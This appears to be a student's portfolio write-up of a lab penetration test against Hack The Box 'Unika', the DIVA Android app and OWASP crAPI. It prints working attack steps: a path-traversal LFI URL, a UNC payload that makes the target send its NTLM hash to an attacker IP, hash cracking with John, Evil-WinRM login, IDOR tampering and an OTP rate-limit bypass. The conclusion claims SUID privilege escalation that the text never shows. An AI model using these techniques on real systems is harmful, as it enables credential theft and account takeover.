# Vulnerability Assessment and Penetration Testing (VAPT)

## Overview

This repository documents a structured Vulnerability Assessment and Penetration Testing (VAPT) workflow carried out in an authorized and controlled lab environment. The objective is to demonstrate practical security testing skills, methodology, and proper technical documentation.

The assessment simulates a real-world attack chain, including reconnaissance, exploitation of web vulnerabilities, credential interception, password cracking, and authenticated remote access.

> **Note on Network Exploitation:**  
> The network attack component for this week (including Responder-based NTLM
> capture, hash cracking, and gaining initial access via Evil-WinRM) is
> documented as part of the **Capstone workflow**, as it represents a realistic
> end-to-end compromise path rather than an isolated technique.


---

## Scope 
- Target Type: Deliberately vulnerable system (Hack The Box – Unika)
- Scope: Network services, web application vulnerabilities, authentication flaws
---

## VAPT Workflow Summary

1. Network Scanning and Enumeration  
2. Web Reconnaissance  
3. Vulnerability Identification (LFI / Info Disclosure)  
4. Exploitation (Responder + NTLM capture)  
5. Credential Cracking  
6. Authenticated Remote Access (Evil-WinRM)  
7. Mobile Application Testing (DIVA)
8. API Security Testing (crAPI)  
---

## Phase 1: Network Scanning and Enumeration

**Tool Used:** Nmap  

```
nmap -A -p- 10.129.15.41
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-19 09:54 -0500
Nmap scan report for unika.htb (10.129.15.41)
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Unika
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Microsoft Windows 10 1909 - 2004 (91%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   170.42 ms 10.10.14.1
2   173.04 ms 10.129.15.41

```

### Result Summary
| Port | Service | Version | Observation |
|------|--------|---------|--------------|
| 80 | HTTP | Apache 2.4.52 | Web app exposed |
| 5985 | WinRM | Microsoft HTTPAPI | Remote access vector |
| 7680 | TCP | Wrapped | Unclear |

OS fingerprinting suggested Windows 10 / Windows Server 2019.

---

## Phase 2: Reconnaissance

### Host Discovery
The web application referenced a domain name: *unika.htb*

![project unika](Capstone/Evidence/hostname.png)

This was added to `/etc/hosts`:
```
echo "10.129.15.41 unika.htb" >> /etc/hosts
```

### Directory Discovery

**Tool Used:** dirsearch
```
 dirsearch  -u http://unika.htb

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/joe/HTB/reports/http_unika.htb/_26-01-19_08-29-52.txt

Target: http://unika.htb/

[08:29:52] Starting:                                         
[08:30:44] 200 -    2KB - /cgi-bin/printenv.pl                                                 
[08:31:08] 200 -    3KB - /inc/                                                                              
[08:31:15] 200 -  973B  - /js/   
```

Discovered endpoints included:
- `/cgi-bin/printenv.pl`
- `/inc/`
- `/js/`

![project cgi](Capstone/Evidence/Information_Disclosure.png)

The CGI script exposed internal environment variables.

---

## Phase 3: Vulnerability Identification

### Information Disclosure
The endpoint `/cgi-bin/printenv.pl` exposed sensitive environment details such as:
- Server paths  
- Server variables  
- Internal hostnames  
- Backend architecture  

This provided strong context for further exploitation.

---

### Local File Inclusion (LFI)

While interacting with the application, a language selection feature (FR / EN / DE)
was observed. Selecting different languages modified the `page` parameter in the URL:

![project ident](Capstone/Evidence/Vuln_Detection.png)

This behavior indicated that the application dynamically includes files based on
user-controlled input. Because the parameter directly references server-side files,
it was identified as a potential attack vector for file inclusion vulnerabilities.

Based on this observation, path traversal payloads were tested:


```
http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts
```
![project hosts](Capstone/Evidence/caido_capture.png)

This successfully disclosed the Windows hosts file, confirming that the `page`
parameter is vulnerable to **Local File Inclusion (LFI) via path traversal**.

---

### Remote File Inclusion (RFI) Testing

Attempted RFI failed due to: *allow_url_include = 0*

![project rfi](Capstone/Evidence/RFI.png)

While RFI execution was blocked, the behavior still allowed outbound authentication
attempts — which was later exploited using Responder.

---

## Phase 4: Exploitation – NTLM Hash Capture

**Tool Used:** Responder  

Responder was started on the attacker machine: *responder -I tun0*

![project resp](Capstone/Evidence/Responder.png)

A crafted request was used:
```
http://unika.htb/index.php?page=//10.10.15.192/someshare
```

This forced the target to authenticate to the attacker-controlled SMB service.

### Result
Responder successfully captured NTLMv2 hash:
```
[SMB] NTLMv2-SSP Client   : 10.129.15.41
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:d8c7246615d1248f:092DB77B0AA0D6930F17BDAD9DE09010:010100000000000000D711482B89DC01EFB961AD5FD20C5B0000000002000800580059004400300001001E00570049004E002D0041004C003400570053005100540052004A005100360004003400570049004E002D0041004C003400570053005100540052004A00510036002E0058005900440030002E004C004F00430041004C000300140058005900440030002E004C004F00430041004C000500140058005900440030002E004C004F00430041004C000700080000D711482B89DC010600040002000000080030003000000000000000010000000020000010AD6A9C143DF276E3FCB57E3094B00C9DCA2B3622525BE66ECA1C45F915D28A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100390032000000000000000000   
```

This demonstrates successful credential interception via network protocol abuse.

---

## Phase 5: Credential Cracking

**Tool Used:** John the Ripper  
```
john --wordlist=/usr/share/wordlists/rockyou.txt NTLM 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2026-01-19 10:26) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Weak password policy allowed trivial offline password recovery.

---

## Phase 6: Authenticated Remote Access

Port 5985 (WinRM) was identified during enumeration.

Using cracked credentials:
```
evil-winrm -u Administrator -p badminton -i 10.129.15.41
```
![project access](Capstone/Evidence/Administrator_access.png)
![project vali](Capstone/Evidence/Permission_validation.png)

This confirms full system compromise.

# Mobile Application Penetration Testing

After completing the system-level exploitation, network assessment, and privilege
escalation phases, the engagement continued with **mobile application security
testing**.

A security assessment was conducted against the **Damn Insecure and Vulnerable App
(DIVA)** in a controlled lab environment to demonstrate practical mobile
pentesting techniques using both **static and dynamic analysis**, aligned with
the **OWASP Mobile Top 10**.

---

## Scope and Environment
- Target Application: Damn Insecure and Vulnerable App (DIVA)  
- Platform: Android Emulator (Genymotion)  
- Attacker Machine: Kali Linux  

### Testing Methodology
- Static analysis (smali code inspection)  
- Dynamic analysis (runtime behavior and logging inspection)  

---

## Tools Used
- adb (Android Debug Bridge)  
- Android Emulator (Genymotion)  
- Linux Terminal (Kali)  

---

## Vulnerability 1: Insecure Logging

### Step 1: Identifying abnormal behavior
While testing the checkout feature, submitting a test credit card resulted in the
error message:
```
An error occured. Please try again later
```

![Checkout screen](Mobile-App-Pentesting/Evidence/credit-card.png)

---

### Step 2: Identifying the vulnerable activity
To understand which component handled this feature, the `AndroidManifest.xml`
file was reviewed.

The following activity was identified:

```
<activity android:label="@string/d1" android:name="jakhar.aseem.diva.LogActivity"/>
```
![project logging](Mobile-App-Pentesting/Evidence/logging-activity.png)

Step 3: Static analysis of smali logic

The corresponding smali file for the activity was reviewed to understand the
application behavior.

The following logging call was identified:
```
invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

.line 26
const-string v2, "An error occured. Please try again later"

```

![project smali](Mobile-App-Pentesting/Evidence/logging-smali.png)

Step 3: Dynamic validation using Logcat

To validate the impact, runtime logs were monitored while performing checkout:
```
adb logcat | grep "credit"  
01-20 13:49:26.700  2512  2512 E diva-log: Error while processing transaction with credit card: 
01-20 13:49:27.035  2512  2512 E diva-log: Error while processing transaction with credit card: 
01-20 13:50:28.184  2512  2512 E diva-log: Error while processing transaction with credit card: 1234123412341234
01-20 14:15:00.573  2512  2512 E diva-log: Error while processing transaction with credit card: 1234123412341234

```
### Impact

Sensitive financial data (credit card numbers) is written to Android logs.
This data could be accessed by:

- Malicious applications on the device

- Anyone with debugging access

- Attackers with physical access

This represents an Insecure Logging vulnerability (OWASP Mobile Top 10 – M2)

## Vulnerability 2: Hardcoded Secret (Smali Analysis)

### Step 1: Reviewing smali code
The application’s smali files were reviewed directly to understand the underlying logic.

Inside the relevant smali file, the following code was identified:

```
const-string v2, "vendorsecretkey"

invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
move-result v1

if-eqz v1, :cond_0

.line 20
const-string v1, "Access granted! See you on the other side :)"
```
This clearly shows that the secret value "vendorsecretkey" is hardcoded directly into the application logic.

![project key](Mobile-App-Pentesting/Evidence/Sensitive_key.png)

Step 2: Exploiting the hardcoded secret

The extracted value was then entered into the application input field.

The application responded with:
```
Access granted! See you on the other side :)

```

![project key](Mobile-App-Pentesting/Evidence/correct_key.png)

### Impact

Because the secret is stored directly inside the application code, any attacker can:

- Decompile or inspect smali files

- Extract sensitive logic or secrets

- Bypass security controls without authentication

This demonstrates a Hardcoded Secret vulnerability, caused by insecure client-side trust and improper secret handling.

# API Security Testing (OWASP crAPI)

After completing system-level, network, privilege escalation, and mobile testing,
the next phase of the assessment focused on **API security testing**.

A security assessment was performed against **OWASP crAPI (Completely Ridiculous
API)** to demonstrate practical API pentesting techniques aligned with the
**OWASP API Top 10**.

---

## Scope and Environment
- Target Application: OWASP crAPI  
- Testing Platform: Kali Linux  
- Intercepting Proxy: Caido  
- Environment: Docker-based crAPI lab  

### Testing Methodology
- Manual request interception  
- Endpoint analysis  
- Parameter tampering  
- Authorization testing  
- Authentication logic testing  

---

## Tools Used
- Caido (Intercepting proxy)  
- Browser  
- Kali Linux  
- Docker (crAPI environment)  

---

## Initial Interaction
A standard user account was created to simulate a real-world attacker context:

```
{"name":"lazzer","email":"lazzer@hackcorp.com","number":"1234567890","password":"SuperStrong@123"}
```

## Vulnerability 1: Content Discovery & Sensitive Data Exposure
### Observation

While browsing the community posts feature, the frontend did not reveal much
information. However, inspection of backend API responses using Caido revealed
that the API exposes sensitive user information.

![project post](API_Security_Testing/Evidence/post_section.png)
The intercepted response contained:
```
{
    "posts": [{
        "id": "8ArJfCiyJEMMTfQdSjeFsF",
        "title": "Title 3",
        "content": "Hello world 3",
        "author": {
            "nickname": "Robot",
            "email": "robot001@example.com",
            "vehicleid": "4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
            "profile_pic_url": "",
            "created_at": "2026-01-19T18:07:16.065Z"
        },
        "comments": [],
        "authorid": 3,
        "CreatedAt": "2026-01-19T18:07:16.065Z"
    }, {
        "id": "HV2xMr3G4ufcoAFqLPK6hS",
        "title": "Title 2",
        "content": "Hello world 2",
        "author": {
            "nickname": "Pogba",
            "email": "pogba006@example.com",
            "vehicleid": "cd515c12-0fc1-48ae-8b61-9230b70a845b",
            "profile_pic_url": "",
            "created_at": "2026-01-19T18:07:16.062Z"
        },
        "comments": [],
        "authorid": 2,
        "CreatedAt": "2026-01-19T18:07:16.062Z"
    }, {
        "id": "3gesMwR9Pq8Lhze53E5c4k",
        "title": "Title 1",
        "content": "Hello world 1",
        "author": {
            "nickname": "Adam",
            "email": "adam007@example.com",
            "vehicleid": "f89b5f21-7829-45cb-a650-299a61090378",
            "profile_pic_url": "",
            "created_at": "2026-01-19T18:07:16.022Z"
        },
        "comments": [],
        "authorid": 1,
        "CreatedAt": "2026-01-19T18:07:16.022Z"
    }],
    "next_offset": null,
    "previous_offset": null,
    "total": 3
}
```

This behavior exposes:

- Email addresses

- Internal user identifiers

- Vehicle identifiers

![project cd](API_Security_Testing/Evidence/Content_discovery.png)

### Impact

This represents Excessive Data Exposure, allowing attackers to collect user
information for further targeted attacks.


## Vulnerability 2: IDOR / BOLA (Broken Object Level Authorization)
### Observation

Using the Contact Mechanic feature, backend requests containing ID parameters
were observed.

![project mech](API_Security_Testing/Evidence/contact_mechanic.png)

The request included a user-specific identifier.

![project id](API_Security_Testing/Evidence/id_request.png)

By modifying the ID value to another user's ID, data belonging to other users
became accessible.

![project IDOR](API_Security_Testing/Evidence/IDOR.png)

### Proof of Exploitation

By changing the ID parameter:

- Other users’ details were retrieved

- Vehicle identifiers were exposed

- Additional requests allowed fetching of other users' vehicle locations

Example sensitive field abused:

```
{
    "posts": [{
        "id": "8ArJfCiyJEMMTfQdSjeFsF",
        "title": "Title 3",
        "content": "Hello world 3",
        "author": {
            "nickname": "Robot",
            "email": "robot001@example.com",
            "vehicleid": "4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
            "profile_pic_url": "",
            "created_at": "2026-01-19T18:07:16.065Z"
        },

```
This was later used to successfully retrieve vehicle location information.

![project veh](API_Security_Testing/Evidence/IDOR_vehicle.png)

### Impact

This confirms a BOLA (Broken Object Level Authorization) vulnerability.
Any authenticated user can access other users’ sensitive data by modifying
request parameters.


## Vulnerability 3: OTP Bypass → Account Takeover
### Observation

The password reset functionality required OTP verification.

![project otp](API_Security_Testing/Evidence/invalid_otp.png)

Invalid OTP attempts returned:
```
{ "message": "Invalid OTP! Please try again.." }
```

After multiple attempts, rate-limiting was enforced:
```
{ "message": "You've exceeded the number of attempts." }

```

### Bypass Technique

By modifying the API version header to an older version, the rate-limiting
controls were bypassed.

This allowed OTP brute-forcing to succeed.

![project by](API_Security_Testing/Evidence/success_otp.png)

Successful request:
```
{"email":"robot001@example.com","otp":"4872","password":"Password@123"}

```

The password reset succeeded, resulting in full account takeover.

![project take](API_Security_Testing/Evidence/account_takeover.png)

### Impact

This vulnerability allows:

- OTP brute-force attacks

- Password reset abuse

- Full account takeover

- Abuse of legacy API versions

This maps to Broken Authentication and Improper API Versioning Controls
within the OWASP API Top 10.


## Conclusion

This VAPT exercise demonstrated a comprehensive security assessment workflow
covering multiple attack surfaces, including **network services, system-level
misconfigurations, web applications, APIs, and mobile applications**. The
assessment progressed from reconnaissance and enumeration to exploitation,
privilege escalation, and post-exploitation validation across controlled lab
environments.

Throughout the tasks, several critical weaknesses were identified and
successfully exploited, including insecure service configurations, broken
access controls (BOLA/IDOR), authentication and logic flaws, privilege
escalation through SUID misconfigurations, insecure data exposure, hardcoded
secrets, insecure logging, and account takeover scenarios within API workflows.

The findings highlight the importance of secure configuration management,
strong authorization enforcement, proper secret handling, secure API design,
and regular security testing across all layers of an application ecosystem.
This work also demonstrates how independent weaknesses across network,
application, and mobile layers can be chained together to achieve full system
compromise when basic security controls are not enforced.

Overall, the project strengthened practical offensive security skills while
emphasizing the value of structured methodology, accurate documentation, and
evidence-driven reporting in real-world security assessments.


























































